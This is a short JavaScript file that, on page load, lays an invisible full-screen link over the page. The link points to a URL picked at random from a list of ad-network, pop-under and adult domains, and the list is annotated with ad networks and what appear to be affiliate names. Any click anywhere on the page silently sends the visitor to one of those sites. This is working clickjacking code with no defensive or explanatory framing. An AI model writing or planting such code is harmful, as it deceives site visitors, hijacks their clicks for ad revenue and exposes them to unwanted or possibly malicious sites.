function createLink() {
  var urls = [
    // hil: db (ss)
    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    "https://www.qrcreate.online",

    // hil: Jacklove
    "http://interestweb.mjsj.sbs/auto",
    
    // mon: Brian
    "https://interestweb.mjsj.sbs/def/auto-mon-brian",

    // clickadilla: Lucy
    "https://hot123.top/tags/",
    // clickadilla: db123
    "https://sexylove.mjsj.sbs",
    // clickadilla: Brian
    "https://json.qrcreate.online",

    // mon: db
    // "https://nutchaungong.com/4/7420689",
    // "https://maipheeg.com/4/7474716",
    // "https://glocheexi.com/4/7237941",
    // "https://coawoaph.net/4/7237942",
    // "https://laichegloavy.com/4/7631332",
    
    "https://vorsoutseemt.com/4/7436813",
    "https://eedootefaug.net/4/7420698",
    "https://futseerdoa.com/4/7237921",
    "https://eeboazurg.net/4/7420696",
    // "https://psauwaun.com/4/7614690",
    // "https://ptougeegnep.net/4/7237907",

    // mon: lucy
    // "https://phuruxoods.com/4/7683326",
    // "https://whauzavouweb.com/4/7683329",
    // "https://naglelri.net/4/7683327",
    // "https://fouwhigrezi.net/4/7683328",
    // "https://boovoogie.net/4/7683330",
    // "https://rangauck.com/4/7683319",
    
    // "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);
